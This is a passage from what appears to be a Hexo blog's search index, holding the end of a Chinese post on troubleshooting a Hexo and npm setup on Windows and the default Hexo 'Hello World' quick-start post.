is not recognized as an internal or external <span class="built_in">command</span>,</span><br><span class="line">operable program or batch file.</span><br><span class="line">WARN Failed to install dependencies. Please run <span class="string">&#x27;npm install&#x27;</span> <span class="keyword">in</span> <span class="string">&quot;E:\blog\env\blogs\smalltown_blog&quot;</span> folder.</span><br></pre></td></tr></table></figure><ul><li><p>但是nmp安装正确：</p><ul><li><img src="/2023/09/18/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/image-20230905155553009.png" alt="image-20230905155553009" style="zoom:80%;"></li></ul></li></ul></li><li><p>最关键的一点：修改&#x3D;&#x3D;这两个文件的权限&#x3D;&#x3D;</p><ul><li>原因：在node.js中，想要利用npm安装模块就需要在管理员权限下进行，但是为了方便文件管理，我们选择将文件放在其他磁盘中存储，而在其他位置cmd没有管理员权限</li><li>解决：将新增的两个模块的所有用户组权限全部提高到和管理员相同，操作如下：<ul><li><img src="/2023/09/18/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91/image-20230905145837588.png" alt="image-20230905145837588"></li></ul></li></ul></li><li><p>修改完权限后，在再开始新建自己的博客文件夹【无所谓位置】，在这个空文件夹内 <code>git bash here</code></p></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br><span class="line"></span><br><span class="line">hexo -v <span class="comment">#查看hexo版本信息，查看是否安装成功</span></span><br></pre></td></tr></table></figure><p>​</p><p>其余参考超链接博文继续博客搭建：</p><p><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169388127516800225537680%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169388127516800225537680&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-82729029-null-null.142%5Ev93%5EchatgptT3_2&utm_term=hexo&spm=1018.2226.3001.4187"></a></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/09/18/hello-world/"/>
      <url>/2023/09/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
